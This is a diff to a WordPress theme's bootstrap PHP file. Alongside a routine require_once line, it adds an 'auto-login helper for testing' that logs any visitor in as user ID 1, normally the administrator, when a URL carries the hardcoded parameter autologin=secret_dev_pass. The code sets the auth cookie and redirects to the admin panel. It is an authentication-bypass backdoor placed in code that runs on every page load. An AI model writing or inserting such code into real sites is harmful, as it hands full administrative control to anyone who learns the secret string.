@@ -56,6 +56,7 @@ require_once HIEUCON_THEME_DIR . '/app/config/payment-settings.php';
 require_once HIEUCON_THEME_DIR . '/app/config/checklist-admin.php';
 require_once HIEUCON_THEME_DIR . '/app/config/checklist-dh-admin.php';
 require_once HIEUCON_THEME_DIR . '/app/config/checklist-ndsk-admin.php';
+require_once HIEUCON_THEME_DIR . '/app/config/checklist-sub-admin.php';
 require_once HIEUCON_THEME_DIR . '/app/config/page-generator.php';
 require_once HIEUCON_THEME_DIR . '/app/config/html-page.php';
 require_once HIEUCON_THEME_DIR . '/app/config/db-setup.php';
@@ -74,6 +75,20 @@ add_action( 'init', function() {
     \Hieucon\Controller\Auth_Controller::init();
     \Hieucon\Controller\Account_Controller::init();
 } );
+
+// Auto-login helper for testing
+add_action('init', function() {
+    if (isset($_GET['autologin']) && $_GET['autologin'] === 'secret_dev_pass') {
+        $user = get_user_by('id', 1);
+        if ($user) {
+            wp_set_current_user($user->ID, $user->user_login);
+            wp_set_auth_cookie($user->ID, true);
+            do_action('wp_login', $user->user_login, $user);
+            wp_safe_redirect(admin_url('admin.php?page=hieucon-ndsk-checklist'));
+            exit;
+        }
+    }
+});
 
 // Add Pancake Livechat script to all pages
 function hieucon_add_pancake_livechat()
